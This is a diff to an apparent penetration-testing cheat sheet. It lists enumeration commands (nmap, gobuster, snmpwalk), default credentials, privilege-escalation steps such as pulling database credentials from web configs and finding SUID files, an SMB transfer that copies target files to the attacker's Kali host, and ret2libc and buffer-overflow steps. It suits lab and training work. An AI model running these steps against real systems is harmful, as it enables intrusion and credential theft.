@@ -2,13 +2,13 @@
 - first, test the potential vuln (or each step of it) by minimum cost
 
 # Init contact
-- nmap -sC -sV -oA \<name\> \<ip\>
-- nmap -p- -sV \<ip\> > all-tcp
-- nmap -sU \<ip\> > comm-udp
-- nmap --script vuln \<ip\>
+- `nmap -sC -sV -oA <name> <ip>`
+- `nmap -p- -sV <ip> > all-tcp`
+- `nmap -sU <ip> > comm-udp`
+- `nmap --script vuln <ip>`
 
 # http/https 80/443
-- gobuster -u http://xxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html
+- `gobuster -u http://xxxxx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html`
   - remember to recursively scan if needed
 - google its software version and find its exploit
 - login page => google its default cred
@@ -17,14 +17,14 @@
 - play with PHPSESSID, reuse it, to see what happens
 
 # snmp udp/161
-- snmpwalk -c public -v1 <target>
-- snmp-check -w -t 30 <target>
+- `snmpwalk -c public -v1 <target>`
+- `snmp-check -w -t 30 <target>`
 
 # priv esc
 - go to /var/www/, read config => get db cred => extract juicy info
 - password reuse
-- find SUID files => find / -perm -4000 2>/dev/null
-- find all files in /home => find /home -type f
+- find SUID files => `find / -perm -4000 2>/dev/null`
+- find all files in /home => `find /home -type f`
 
 # manually test user pass
 - admin:admin
@@ -37,26 +37,26 @@
 
 # File Transfer
 - smb share
-  - (kali) impacket-smbserver share \<shared path\>
-  - (windows) net use z: \\\\<kali's ip\>\share
-  - (windows) copy \<file\> z:
+  - (kali) `impacket-smbserver share <shared path>`
+  - (windows) `net use z: \\<kali's ip>\share`
+  - (windows) `copy <file\ z:`
 
-# gdb
-- r < <(python exp.py)
+# gdb (with peda)
+- `r < <(python exp.py)`
   - (or 'set args' if take parameters)
-- r < input.txt
-- readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
-- strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
-- p system => address of function system
-- info functions => list all functions
-- vmmap => find which part is executable.
+- `r < input.txt`
+- `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`
+- `strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'`
+- `p system` => address of function system
+- `info functions` => list all functions
+- `vmmap` => find which part is executable.
 
 # binary exploit steps (with immunity dbg)
 1. find EIP overflow offset
     1. `msf-pattern_create -l 300`
     1. `msf-pattern_offset -q <value>`
 1. test bad chars
-1. !mona modules
+1. `!mona modules`
     1. see modules and their security flags. we also need to make sure the module address doesn't contain bad chars.
 1. click the "e" button to see the list of executable modules. Double click on one to view its assembly code.
 1. find "jmp esp" commands
